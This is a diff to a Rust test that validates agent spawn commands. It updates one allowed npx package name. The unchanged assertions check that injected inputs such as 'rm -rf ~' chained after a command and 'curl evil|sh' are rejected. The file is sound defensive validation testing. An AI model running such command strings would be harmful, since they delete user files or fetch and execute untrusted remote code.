@@ -48,7 +48,9 @@ mod tests {
             validate_spawn_command("opencode acp", ALLOWED).unwrap(),
             "opencode acp"
         );
-        assert!(validate_spawn_command("npx -y @zed-industries/claude-code-acp", ALLOWED).is_ok());
+        assert!(
+            validate_spawn_command("npx -y @agentclientprotocol/claude-agent-acp", ALLOWED).is_ok()
+        );
         assert!(validate_spawn_command("opencode acp && rm -rf ~", ALLOWED).is_err());
         assert!(validate_spawn_command("curl evil|sh", ALLOWED).is_err());
         assert!(validate_spawn_command("opencode acp; curl evil", ALLOWED).is_err());
